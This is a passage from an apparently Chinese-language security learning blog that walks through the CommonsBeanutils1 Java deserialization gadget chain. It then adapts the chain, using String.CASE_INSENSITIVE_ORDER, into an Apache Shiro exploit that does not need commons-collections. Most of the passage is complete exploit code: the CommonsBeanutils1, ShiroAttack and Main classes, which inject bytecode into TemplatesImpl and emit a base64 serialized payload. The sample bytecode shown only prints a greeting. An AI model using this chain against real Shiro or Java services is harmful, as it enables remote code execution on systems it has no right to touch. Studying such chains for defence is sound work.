<span class="hljs-type">int</span> <span class="hljs-title function_">compare</span><span class="hljs-params">( T o1, T o2 )</span> &#123;<br><br>    <span class="hljs-keyword">if</span> ( property == <span class="hljs-literal">null</span> ) &#123;<br>        <span class="hljs-comment">// compare the actual objects</span><br>        <span class="hljs-keyword">return</span> internalCompare( o1, o2 );<br>    &#125;<br><br>    <span class="hljs-keyword">try</span> &#123;<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">value1</span> <span class="hljs-operator">=</span> PropertyUtils.getProperty( o1, property );<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">value2</span> <span class="hljs-operator">=</span> PropertyUtils.getProperty( o2, property );<br>        <span class="hljs-keyword">return</span> internalCompare( value1, value2 );<br>    &#125;<br>    <span class="hljs-keyword">catch</span> ( IllegalAccessException iae ) &#123;<br>        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RuntimeException</span>( <span class="hljs-string">&quot;IllegalAccessException: &quot;</span> + iae.toString() );<br>    &#125;<br>    <span class="hljs-keyword">catch</span> ( InvocationTargetException ite ) &#123;<br>        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RuntimeException</span>( <span class="hljs-string">&quot;InvocationTargetException: &quot;</span> + ite.toString() );<br>    &#125;<br>    <span class="hljs-keyword">catch</span> ( NoSuchMethodException nsme ) &#123;<br>        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RuntimeException</span>( <span class="hljs-string">&quot;NoSuchMethodException: &quot;</span> + nsme.toString() );<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>这个方法传入两个对象，如果 this.property 为空，则直接比较这两个对象；如果 this.property 不为空，则用 PropertyUtils.getProperty 分别取这两个对象的 this.property 属性，比较属性的值。</p><p> PropertyUtils.getProperty 这个方法会自动去调用一个JavaBean的getter方法，这个点是任意代码执行的关键。</p><p>在分析<code>TemplatesImpl</code>时，我们调用过<code>getOutputProperties()</code>,它是以get开头，符合getter的定义</p><p>下面是我们之前用到过的TemplatesImpl的调用链</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java">TemplatesImpl#getOutputProperties() -&gt; TemplatesImpl#newTransformer() -&gt;<br>TemplatesImpl#getTransletInstance() -&gt;<br>TemplatesImpl#defineTransletClasses() -&gt;<br>TransletClassLoader#defineClass()<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">PropertyUtils.getProperty( o1, property )<br></code></pre></td></tr></table></figure><p>当o1为TemplatesImpl对象，而property值为outputProperties时，将会自动调用getter，即调用<code>getOutputProperties()</code>，触发代码执行</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">getProperty</span><span class="hljs-params">(Object bean, String name)</span><br>        <span class="hljs-keyword">throws</span> IllegalAccessException, InvocationTargetException,<br>        NoSuchMethodException &#123;<br><br>    <span class="hljs-keyword">return</span> (PropertyUtilsBean.getInstance().getProperty(bean, name));<br><br>&#125;<br></code></pre></td></tr></table></figure><h2 id="利用链构造"><a href="#利用链构造" class="headerlink" title="利用链构造"></a>利用链构造</h2><p>所以我们的利用链是这样的</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs java">ObjectInputStream.readObject()<br>   PriorityQueue.readObject()<br>      ...<br>         TransformingComparator.compare()<br>            InvokerTransformer.transform()<br>               Method.invoke()<br>                  Runtime.exec()<br></code></pre></td></tr></table></figure><p>创建TemplateImpl</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplatesImpl</span>();<br>       setFieldValue(obj, <span class="hljs-string">&quot;_bytecodes&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[][]&#123;<br>           ClassPool.getDefault().get(evil.EvilTemplatesImpl.class.getName()).toBytecode()<br>       &#125;);<br>       setFieldValue(obj, <span class="hljs-string">&quot;_name&quot;</span>, <span class="hljs-string">&quot;HelloTemplatesImpl&quot;</span>);<br>       setFieldValue(obj, <span class="hljs-string">&quot;_tfactory&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformerFactoryImpl</span>());<br></code></pre></td></tr></table></figure><p>当<code>BeanComparator</code>构造函数为空时，property为空</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-title function_">BeanComparator</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-built_in">this</span>( <span class="hljs-literal">null</span> );<br>&#125;<br></code></pre></td></tr></table></figure><p>所以实例化<code>Comparator</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">final</span> <span class="hljs-type">BeanComparator</span> <span class="hljs-variable">comparator</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BeanComparator</span>();<br></code></pre></td></tr></table></figure><p>用这个<code>obj</code>实例化<code>PriorityQueue</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">final</span> PriorityQueue&lt;Object&gt; queue = <span class="hljs-keyword">new</span> <span class="hljs-title class_">PriorityQueue</span>&lt;Object&gt;(<span class="hljs-number">2</span>,<br>            comparator);<br><span class="hljs-comment">// stub data for replacement later</span><br>        queue.add(<span class="hljs-number">1</span>);<br>        queue.add(<span class="hljs-number">1</span>);<br></code></pre></td></tr></table></figure><p>可见，我们添加了两个无害的可以比较的对象进队列中。前文说过， BeanComparator#compare() 中，如果 this.property 为空，则直接比较这两个对象。这里实际上就是对两个 1 进行排序。</p><p>初始化时使用正经对象，且 property 为空，这一系列操作是为了初始化的时候不要出错。然后，我们再用反射将 property 的值设置成恶意的 outputProperties ，将队列里的两个1替换成恶意的TemplateImpl 对象：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java">setFieldValue(comparator, <span class="hljs-string">&quot;property&quot;</span>, <span class="hljs-string">&quot;outputProperties&quot;</span>);<br>setFieldValue(queue, <span class="hljs-string">&quot;queue&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;obj, obj&#125;);<br></code></pre></td></tr></table></figure><p>完整的利用链如下</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> ysoserial.practice;<br><br><span class="hljs-keyword">import</span> java.io.ByteArrayInputStream;<br><span class="hljs-keyword">import</span> java.io.ByteArrayOutputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectInputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectOutputStream;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.util.PriorityQueue;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;<br><span class="hljs-keyword">import</span> javassist.ClassPool;<br><span class="hljs-keyword">import</span> org.apache.commons.beanutils.BeanComparator;<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CommonsBeanutils1</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setFieldValue</span><span class="hljs-params">(Object obj, String fieldName, Object</span><br><span class="hljs-params">        value)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> obj.getClass().getDeclaredField(fieldName);<br>        field.setAccessible(<span class="hljs-literal">true</span>);<br>        field.set(obj, value);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplatesImpl</span>();<br>        setFieldValue(obj, <span class="hljs-string">&quot;_bytecodes&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[][]&#123;<br>            ClassPool.getDefault().get(evil.EvilTemplatesImpl.class.getName()).toBytecode()<br>        &#125;);<br>        setFieldValue(obj, <span class="hljs-string">&quot;_name&quot;</span>, <span class="hljs-string">&quot;HelloTemplatesImpl&quot;</span>);<br>        setFieldValue(obj, <span class="hljs-string">&quot;_tfactory&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformerFactoryImpl</span>());<br>        <span class="hljs-keyword">final</span> <span class="hljs-type">BeanComparator</span> <span class="hljs-variable">comparator</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BeanComparator</span>();<br>        <span class="hljs-keyword">final</span> PriorityQueue&lt;Object&gt; queue = <span class="hljs-keyword">new</span> <span class="hljs-title class_">PriorityQueue</span>&lt;Object&gt;(<span class="hljs-number">2</span>,<br>            comparator);<br><span class="hljs-comment">// stub data for replacement later</span><br>        queue.add(<span class="hljs-number">1</span>);<br>        queue.add(<span class="hljs-number">1</span>);<br>        setFieldValue(comparator, <span class="hljs-string">&quot;property&quot;</span>, <span class="hljs-string">&quot;outputProperties&quot;</span>);<br>        setFieldValue(queue, <span class="hljs-string">&quot;queue&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;obj, obj&#125;);<br><br>        <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">barr</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(barr);<br>        oos.writeObject(queue);<br>        oos.close();<br>        System.out.println(barr);<br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span><br>            <span class="hljs-title class_">ByteArrayInputStream</span>(barr.toByteArray()));<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">o</span> <span class="hljs-operator">=</span> (Object)ois.readObject();<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>奇怪的是这里的evil用不了</p><p>(先埋好坑，以后再来)</p><h1 id="无commons-collections的Shiro反序列化利用"><a href="#无commons-collections的Shiro反序列化利用" class="headerlink" title="无commons-collections的Shiro反序列化利用"></a>无commons-collections的Shiro反序列化利用</h1><p>先看<code>org.apache.commons.collections.comparators.ComparableComparator</code>在哪里使用了</p><p><img src="https://cdn.jsdelivr.net/gh/Decemberus/image/202303191238911.png" alt="image-20230224204318231"> </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-title function_">BeanComparator</span><span class="hljs-params">( String property )</span> &#123;<br>    <span class="hljs-built_in">this</span>( property, ComparableComparator.getInstance() );<br>&#125;<br></code></pre></td></tr></table></figure><p>在这个构造函数处，如果没有显式传入<code>Comparator</code>，就默认使用<code>ComparableComparator</code></p><blockquote><p>解释一下什么是显式传入</p><p>在构造函数中，如果调用者明确地传入了一个 Comparator 对象作为参数，就称为“显式传入 Comparator 对象”。例如，下面的代码中就显式地传入了一个自定义的 Comparator 对象，用于对字符串列表进行排序：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs java">List&lt;String&gt; stringList = Arrays.asList(<span class="hljs-string">&quot;foo&quot;</span>, <span class="hljs-string">&quot;bar&quot;</span>, <span class="hljs-string">&quot;baz&quot;</span>);<br>Collections.sort(stringList, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Comparator</span>&lt;String&gt;() &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">compare</span><span class="hljs-params">(String s1, String s2)</span> &#123;<br>        <span class="hljs-keyword">return</span> s1.compareTo(s2);<br>    &#125;<br>&#125;);<br></code></pre></td></tr></table></figure><p>相反，如果在构造函数中没有传入 Comparator 对象，就需要使用默认的比较器来比较对象。</p><p>而ComparableComparator.getInstance() 就是默认的一个新的Comparator</p></blockquote><p>既然此时没有 ComparableComparator ，我们需要找到一个类来替换，它满足下面这几个条件：</p><ul><li><p>实现 java.util.Comparator 接口</p></li><li><p>实现 java.io.Serializable 接口</p></li><li><p>Java、shiro或commons-beanutils自带，且兼容性强</p></li></ul><p>通过IDEA的功能，我们找到一个 <code>CaseInsensitiveComparator</code> ：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> Comparator&lt;String&gt; CASE_INSENSITIVE_ORDER<br>                                     = <span class="hljs-keyword">new</span> <span class="hljs-title class_">CaseInsensitiveComparator</span>();<br><span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CaseInsensitiveComparator</span><br>        <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Comparator</span>&lt;String&gt;, java.io.Serializable &#123;<br>    <span class="hljs-comment">// use serialVersionUID from JDK 1.2.2 for interoperability</span><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">long</span> <span class="hljs-variable">serialVersionUID</span> <span class="hljs-operator">=</span> <span class="hljs-number">8575799808933029326L</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">compare</span><span class="hljs-params">(String s1, String s2)</span> &#123;<br>        <span class="hljs-type">int</span> <span class="hljs-variable">n1</span> <span class="hljs-operator">=</span> s1.length();<br>        <span class="hljs-type">int</span> <span class="hljs-variable">n2</span> <span class="hljs-operator">=</span> s2.length();<br>        <span class="hljs-type">int</span> <span class="hljs-variable">min</span> <span class="hljs-operator">=</span> Math.min(n1, n2);<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; min; i++) &#123;<br>            <span class="hljs-type">char</span> <span class="hljs-variable">c1</span> <span class="hljs-operator">=</span> s1.charAt(i);<br>            <span class="hljs-type">char</span> <span class="hljs-variable">c2</span> <span class="hljs-operator">=</span> s2.charAt(i);<br>            <span class="hljs-keyword">if</span> (c1 != c2) &#123;<br>                c1 = Character.toUpperCase(c1);<br>                c2 = Character.toUpperCase(c2);<br>                <span class="hljs-keyword">if</span> (c1 != c2) &#123;<br>                    c1 = Character.toLowerCase(c1);<br>                    c2 = Character.toLowerCase(c2);<br>                    <span class="hljs-keyword">if</span> (c1 != c2) &#123;<br>                        <span class="hljs-comment">// No overflow because of numeric promotion</span><br>                        <span class="hljs-keyword">return</span> c1 - c2;<br>                    &#125;<br>                &#125;<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">return</span> n1 - n2;<br>    &#125;<br><br>    <span class="hljs-comment">/** Replaces the de-serialized object. */</span><br>    <span class="hljs-keyword">private</span> Object <span class="hljs-title function_">readResolve</span><span class="hljs-params">()</span> &#123; <span class="hljs-keyword">return</span> CASE_INSENSITIVE_ORDER; &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>这个 CaseInsensitiveComparator 类是 java.lang.String 类下的一个内部私有类，其实现了Comparator 和 Serializable ，且位于Java的核心代码中，兼容性强，是一个完美替代品。</p><p>我们通过 String.CASE_INSENSITIVE_ORDER 即可拿到上下文中的 CaseInsensitiveComparator 对象，用它来实例化 BeanComparator ：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">final</span> <span class="hljs-type">BeanComparator</span> <span class="hljs-variable">comparator</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BeanComparator</span>(<span class="hljs-literal">null</span>,String.CASE_INSENSITIVE_ORDER);<br></code></pre></td></tr></table></figure><p>最后，构造出新的CommonsBeanutils1Shiro利用链：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> ysoserial.practice;<br><br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;<br><span class="hljs-keyword">import</span> org.apache.commons.beanutils.BeanComparator;<br><br><span class="hljs-keyword">import</span> java.io.ByteArrayOutputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectOutputStream;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.util.PriorityQueue;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ShiroAttack</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setFieldValue</span><span class="hljs-params">(Object obj,String fieldName,Object value)</span><span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> obj.getClass().getDeclaredField(fieldName);<br>        field.setAccessible(<span class="hljs-literal">true</span>);<br>        field.set(obj,value);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-type">byte</span>[] getPayload(<span class="hljs-type">byte</span>[] clazzBytes) <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplatesImpl</span>();<br>        setFieldValue(obj, <span class="hljs-string">&quot;_bytecodes&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[][]&#123;clazzBytes&#125;);<br>        setFieldValue(obj, <span class="hljs-string">&quot;_name&quot;</span>, <span class="hljs-string">&quot;HelloTemplatesImpl&quot;</span>);<br>        setFieldValue(obj, <span class="hljs-string">&quot;_tfactory&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformerFactoryImpl</span>());<br><br>        <span class="hljs-keyword">final</span> <span class="hljs-type">BeanComparator</span> <span class="hljs-variable">comparator</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BeanComparator</span>(<span class="hljs-literal">null</span>,<br>            String.CASE_INSENSITIVE_ORDER);<br>        <span class="hljs-keyword">final</span> PriorityQueue&lt;Object&gt; queue = <span class="hljs-keyword">new</span> <span class="hljs-title class_">PriorityQueue</span>&lt;Object&gt;(<span class="hljs-number">2</span>,<br>            comparator);<br><span class="hljs-comment">// stub data for replacement later</span><br>        queue.add(<span class="hljs-string">&quot;1&quot;</span>);<br>        queue.add(<span class="hljs-string">&quot;1&quot;</span>);<br>        setFieldValue(comparator, <span class="hljs-string">&quot;property&quot;</span>, <span class="hljs-string">&quot;outputProperties&quot;</span>);<br>        setFieldValue(queue, <span class="hljs-string">&quot;queue&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;obj, obj&#125;);<br><span class="hljs-comment">// ==================</span><br><span class="hljs-comment">// 生成序列化字符串</span><br>        <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">barr</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(barr);<br>        oos.writeObject(queue);<br>        oos.close();<br>        <span class="hljs-keyword">return</span> barr.toByteArray();<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>然后我写一个简单的利用程序</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> ysoserial.practice;<br><br><span class="hljs-keyword">import</span> java.util.Base64;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Main</span> &#123;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br><span class="hljs-comment">// source: bytecodes/HelloTemplateImpl.java</span><br>        <span class="hljs-type">ShiroAttack</span> <span class="hljs-variable">attack</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ShiroAttack</span>();<br>        <span class="hljs-type">byte</span>[] clazzBytes= Base64.getDecoder().decode(<span class="hljs-string">&quot;yv66vgAAADQAGwoABgANCQAOAA8IABAKABEAEgcAEwcAFAEABjxpbml0PgEAAygpVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBAApTb3VyY2VGaWxlAQAKSGVsbG8uamF2YQwABwAIBwAVDAAWABcBAAtIZWxsbyBXb3JsZAcAGAwAGQAaAQAFSGVsbG8BABBqYXZhL2xhbmcvT2JqZWN0AQAQamF2YS9sYW5nL1N5c3RlbQEAA291dAEAFUxqYXZhL2lvL1ByaW50U3RyZWFtOwEAE2phdmEvaW8vUHJpbnRTdHJlYW0BAAdwcmludGxuAQAVKExqYXZhL2xhbmcvU3RyaW5nOylWACEABQAGAAAAAAABAAEABwAIAAEACQAAAC0AAgABAAAADSq3AAGyAAISA7YABLEAAAABAAoAAAAOAAMAAAACAAQABAAMAAUAAQALAAAAAgAM&quot;</span>);<br>        <span class="hljs-type">byte</span>[] payload = attack.getPayload(clazzBytes);<br>        System.out.println(payload);<br>    &#125;<br>&#125;<br><br><span class="hljs-comment">//输出为[B@77a567e1</span><br></code></pre></td></tr></table></figure><p>这个输出并不是预期的payload</p><p>这是因为<code>System.out.println(payload)</code> 打印的是字节数组的地址，而不是它的内容。</p><p>要正确地输出 payload 的内容，需要使用 <code>Base64</code> 编码将它转换为一个字符串</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> ysoserial.practice;<br><br><span class="hljs-keyword">import</span> java.util.Base64;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Main</span> &#123;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br><span class="hljs-comment">// source: bytecodes/HelloTemplateImpl.java</span><br>        <span class="hljs-type">ShiroAttack</span> <span class="hljs-variable">attack</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ShiroAttack</span>();<br>        <span class="hljs-type">byte</span>[] clazzBytes= Base64.getDecoder().decode(<span class="hljs-string">&quot;yv66vgAAADQAGwoABgANCQAOAA8IABAKABEAEgcAEwcAFAEABjxpbml0PgEAAygpVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBAApTb3VyY2VGaWxlAQAKSGVsbG8uamF2YQwABwAIBwAVDAAWABcBAAtIZWxsbyBXb3JsZAcAGAwAGQAaAQAFSGVsbG8BABBqYXZhL2xhbmcvT2JqZWN0AQAQamF2YS9sYW5nL1N5c3RlbQEAA291dAEAFUxqYXZhL2lvL1ByaW50U3RyZWFtOwEAE2phdmEvaW8vUHJpbnRTdHJlYW0BAAdwcmludGxuAQAVKExqYXZhL2xhbmcvU3RyaW5nOylWACEABQAGAAAAAAABAAEABwAIAAEACQAAAC0AAgABAAAADSq3AAGyAAISA7YABLEAAAABAAoAAAAOAAMAAAACAAQABAAMAAUAAQALAAAAAgAM&quot;</span>);<br>        <span class="hljs-type">byte</span>[] payload = attack.getPayload(clazzBytes);<br>        <span class="hljs-type">String</span> <span class="hljs-variable">s</span> <span class="hljs-operator">=</span> Base64.getEncoder().encodeToString(payload);<br>        System.out.println(s);<br>    &#125;<br>&#125;<br><span 